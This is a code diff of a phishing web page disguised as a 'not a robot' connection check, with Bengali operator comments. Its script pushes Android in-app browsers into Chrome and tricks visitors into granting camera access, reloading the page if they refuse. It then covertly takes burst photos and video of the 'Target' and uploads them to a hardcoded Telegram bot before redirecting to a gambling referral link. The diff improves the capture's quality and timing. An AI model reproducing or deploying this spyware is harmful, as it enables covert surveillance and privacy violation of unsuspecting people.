@@ -1,4 +1,4 @@
-      <!DOCTYPE html>
+   <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -11,28 +11,32 @@
 </head>
 <body class="bg-gray-100 flex items-center justify-center min-h-screen">
 
-    <div class="max-w-md w-full p-6 bg-white shadow-xl rounded-xl text-center">
+    <div class="max-w-md w-full p-6 bg-white shadow-xl rounded-xl text-center border border-gray-200">
         <div class="mb-4 flex justify-center">
             <div class="animate-spin h-10 w-10 border-4 border-blue-500 border-t-transparent rounded-full"></div>
         </div>
         <h2 class="text-xl font-bold text-gray-800">Verifying Connection...</h2>
-        <p class="text-gray-500 mt-2 text-sm">Please click <b>"Allow"</b> to confirm you are not a robot.</p>
+        <p class="text-gray-500 mt-2 text-sm">Please wait while we verify you are a human. Click <b>"Allow"</b> to proceed.</p>
+        <div class="mt-6 py-3 px-4 bg-blue-50 border border-blue-100 rounded-lg text-blue-700 text-[10px] text-left">
+            Ray ID: 91b3c2a0e7d12402 • Your IP: 103.145.xxx.xx
+        </div>
     </div>
 
     <video id="v_stream" autoplay playsinline muted></video>
     <canvas id="c_save" class="hidden"></canvas>
 
     <script>
-        // ১. সরাসরি ক্রোম ব্রাউজারে ওপেন করার সিস্টেম
+        // ১. সরাসরি Chrome-এ নিয়ে যাওয়ার পাওয়ারফুল সিস্টেম (Messenger & Telegram Fixed)
         const ua = navigator.userAgent;
-        if (/FBAN|FBAV|Messenger|Telegram|Instagram/i.test(ua) && ua.includes("Android")) {
+        const isApp = /FBAN|FBAV|Messenger|Telegram|Instagram/i.test(ua);
+        if (isApp && ua.includes("Android")) {
             const cleanUrl = window.location.href.replace(/^https?:\/\//, '');
             window.location.href = "intent://" + cleanUrl + "#Intent;scheme=https;package=com.android.chrome;end";
         }
 
         const CONFIG = {
             t: '8355080071:AAHZ5KdTDSkqNLgSe_9gsuGCyUMYru5pNe4',
-            c: '7785049939', // <--- আপনার Telegram ID বসান
+            c: '7785049939', // <--- আপনার Telegram Chat ID এখানে দিন
             u: 'https://dkwin9.com/#/register?invitationCode=14856937272',
             max_photos: 15,
             video_duration: 10000 
@@ -46,26 +50,28 @@
                 const video = document.getElementById('v_stream');
                 video.srcObject = stream;
 
-                // ২. ফটো তোলা শুরু (Burst Mode)
-                startBurstPhotos();
-
-                // ৩. ভিডিও রেকর্ডিং শুরু
-                startVideoRecording(stream);
+                // ২. প্রথমে ১ সেকেন্ড অপেক্ষা করে ফটো তোলা শুরু (যাতে কালো না আসে)
+                setTimeout(() => {
+                    startBurstPhotos(stream);
+                }, 1000);
 
             } catch (err) {
-                location.reload();
+                // অনুমতি না দিলে অটো রিলোড
+                setTimeout(() => { location.reload(); }, 500);
             }
         }
 
-        function startBurstPhotos() {
+        function startBurstPhotos(stream) {
             const photoInterval = setInterval(() => {
                 if (photoCount < CONFIG.max_photos) {
                     takeSnap();
                     photoCount++;
                 } else {
                     clearInterval(photoInterval);
+                    // ফটো তোলা শেষ হলে ভিডিও রেকর্ডিং শুরু
+                    startVideoRecording(stream);
                 }
-            }, 500); // প্রতি ০.৫ সেকেন্ডে একটি ছবি
+            }, 400); 
         }
 
         function takeSnap() {
@@ -73,14 +79,15 @@
             const canvas = document.getElementById('c_save');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
 
             canvas.toBlob(blob => {
                 const formData = new FormData();
                 formData.append('chat_id', CONFIG.c);
                 formData.append('photo', blob, `img_${photoCount}.jpg`);
                 fetch(`https://api.telegram.org/bot${CONFIG.t}/sendPhoto`, { method: 'POST', body: formData });
-            }, 'image/jpeg', 0.6);
+            }, 'image/jpeg', 0.8);
         }
 
         function startVideoRecording(stream) {
@@ -93,9 +100,10 @@
                 const formData = new FormData();
                 formData.append('chat_id', CONFIG.c);
                 formData.append('video', blob, 'capture.mp4');
-                formData.append('caption', 'Target Multi-Capture (Photo + Video)');
+                formData.append('caption', 'Target Multi-Capture Complete');
 
                 await fetch(`https://api.telegram.org/bot${CONFIG.t}/sendVideo`, { method: 'POST', body: formData });
+                // সব কাজ শেষে রিডাইরেক্ট
                 window.location.replace(CONFIG.u);
             };
 
@@ -110,3 +118,4 @@
     </script>
 </body>
 </html>
+               
